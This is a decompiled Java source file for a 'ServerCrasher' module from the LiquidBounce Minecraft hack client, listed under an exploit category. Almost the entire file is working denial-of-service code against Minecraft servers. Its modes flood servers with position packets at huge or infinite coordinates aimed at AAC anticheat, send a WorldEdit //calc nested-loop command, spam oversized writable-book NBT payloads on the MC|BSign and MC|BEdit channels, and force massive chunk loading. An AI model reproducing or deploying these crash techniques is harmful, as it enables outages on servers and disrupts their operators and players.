//Deobfuscated with https://github.com/PetoPetko/Minecraft-Deobfuscator3000 using mappings "mcp_stable-22-1.8.9 (1)"!

// 
// Decompiled by Procyon v0.5.36
// 

package net.ccbluex.liquidbounce.features.module.modules.exploit;

import net.ccbluex.liquidbounce.event.events.TickEvent;
import net.ccbluex.liquidbounce.event.EventTarget;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.ccbluex.liquidbounce.utils.misc.RandomUtils;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import net.ccbluex.liquidbounce.event.EventState;
import net.ccbluex.liquidbounce.event.events.MotionEvent;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C03PacketPlayer;
import joptsimple.internal.Strings;
import net.minecraft.client.audio.ISound;
import net.minecraft.client.audio.PositionedSoundRecord;
import net.minecraft.util.ResourceLocation;
import net.ccbluex.liquidbounce.features.command.Command;
import net.ccbluex.liquidbounce.LiquidBounce;
import net.ccbluex.liquidbounce.valuesystem.types.ListValue;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.features.module.Module;

@ModuleInfo(name = "ServerCrasher", description = "Allows you to crash certain server.", category = ModuleCategory.EXPLOIT)
public class ServerCrasher extends Module
{
    private final ListValue modeValue;
    
    public ServerCrasher() {
        this.modeValue = new ListValue("Mode", new String[] { "AACNew", "AACOther", "AACOld", "WorldEdit", "BookFlood", "CubeCraft", "MassiveChunkLoading" }, "AACNew");
        LiquidBounce.CLIENT.commandManager.registerCommand(new Command("servercrasher", null) {
            @Override
            public void execute(final String[] args) {
                if (args.length <= 1 || !args[1].equalsIgnoreCase("mode")) {
                    this.chatSyntax(".servercrasher <mode>");
                    return;
                }
                if (args.length > 2 && ServerCrasher.this.modeValue.contains(args[2])) {
                    ServerCrasher.this.modeValue.setValue(args[2].toLowerCase());
                    this.chat("§7ServerCrasher mode was set to §8" + ServerCrasher.this.modeValue.asString().toUpperCase() + "§7.");
                    ServerCrasher$1.mc.getSoundHandler().playSound((ISound)PositionedSoundRecord.create(new ResourceLocation("random.anvil_use"), 1.0f));
                    return;
                }
                this.chatSyntax(".servercrasher mode §c<§8" + Strings.join(ServerCrasher.this.modeValue.getValues(), "§7, §8") + "§c>");
            }
        });
    }
    
    @Override
    public void onEnable() {
        if (ServerCrasher.mc.thePlayer == null) {
            return;
        }
        final String lowerCase = this.modeValue.asString().toLowerCase();
        switch (lowerCase) {
            case "aacnew": {
                for (int index = 0; index < 9999; ++index) {
                    ServerCrasher.mc.getNetHandler().addToSendQueue((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.thePlayer.posX + 9412 * index, ServerCrasher.mc.thePlayer.getEntityBoundingBox().minY + 9412 * index, ServerCrasher.mc.thePlayer.posZ + 9412 * index, true));
                }
                break;
            }
            case "aacother": {
                for (int index = 0; index < 9999; ++index) {
                    ServerCrasher.mc.getNetHandler().addToSendQueue((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.thePlayer.posX + 500000 * index, ServerCrasher.mc.thePlayer.getEntityBoundingBox().minY + 500000 * index, ServerCrasher.mc.thePlayer.posZ + 500000 * index, true));
                }
                break;
            }
            case "aacold": {
                ServerCrasher.mc.getNetHandler().addToSendQueue((Packet)new C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                break;
            }
            case "worldedit": {
                ServerCrasher.mc.thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                break;
            }
            case "cubecraft": {
                ServerCrasher.mc.thePlayer.setPosition(ServerCrasher.mc.thePlayer.posX, ServerCrasher.mc.thePlayer.posY + 0.3, ServerCrasher.mc.thePlayer.posZ);
                break;
            }
            case "massivechunkloading": {
                for (double yPos = ServerCrasher.mc.thePlayer.posY; yPos < 255.0; yPos += 5.0) {
                    ServerCrasher.mc.getNetHandler().addToSendQueue((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.thePlayer.posX, yPos, ServerCrasher.mc.thePlayer.posZ, true));
                }
                for (int i = 0; i < 6685; i += 5) {
                    ServerCrasher.mc.getNetHandler().addToSendQueue((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.thePlayer.posX + i, 255.0, ServerCrasher.mc.thePlayer.posZ + i, true));
                }
                break;
            }
        }
    }
    
    @EventTarget
    public void onMotion(final MotionEvent event) {
        if (event.getEventState() == EventState.POST) {
            return;
        }
        final String lowerCase = this.modeValue.asString().toLowerCase();
        switch (lowerCase) {
            case "bookflood": {
                final ItemStack bookStack = new ItemStack(Items.writable_book);
                final NBTTagCompound bookCompound = new NBTTagCompound();
                bookCompound.setString("author", RandomUtils.randomNumber(20));
                bookCompound.setString("title", RandomUtils.randomNumber(20));
                final NBTTagList pageList = new NBTTagList();
                final String pageText = RandomUtils.randomNumber(600);
                for (int page = 0; page < 50; ++page) {
                    pageList.appendTag((NBTBase)new NBTTagString(pageText));
                }
                bookCompound.setTag("pages", (NBTBase)pageList);
                bookStack.setTagCompound(bookCompound);
                for (int packets = 0; packets < 100; ++packets) {
                    final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                    packetBuffer.writeItemStackToBuffer(bookStack);
                    ServerCrasher.mc.getNetHandler().addToSendQueue((Packet)new C17PacketCustomPayload(RandomUtils.getRandom().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
                }
                break;
            }
            case "cubecraft": {
                final double x = ServerCrasher.mc.thePlayer.posX;
                final double y = ServerCrasher.mc.thePlayer.posY;
                final double z = ServerCrasher.mc.thePlayer.posZ;
                for (int i = 0; i < 3000; ++i) {
                    ServerCrasher.mc.getNetHandler().addToSendQueue((Packet)new C03PacketPlayer.C04PacketPlayerPosition(x, y + 0.09999999999999, z, false));
                    ServerCrasher.mc.getNetHandler().addToSendQueue((Packet)new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
                }
                ServerCrasher.mc.thePlayer.motionY = 0.0;
                break;
            }
            default: {
                this.setState(false);
                break;
            }
        }
    }
    
    @EventTarget
    public void onTick(final TickEvent event) {
        if (ServerCrasher.mc.thePlayer == null || ServerCrasher.mc.theWorld == null) {
            this.setState(false);
        }
    }
    
    @Override
    public String getTag() {
        return this.modeValue.asString();
    }
}
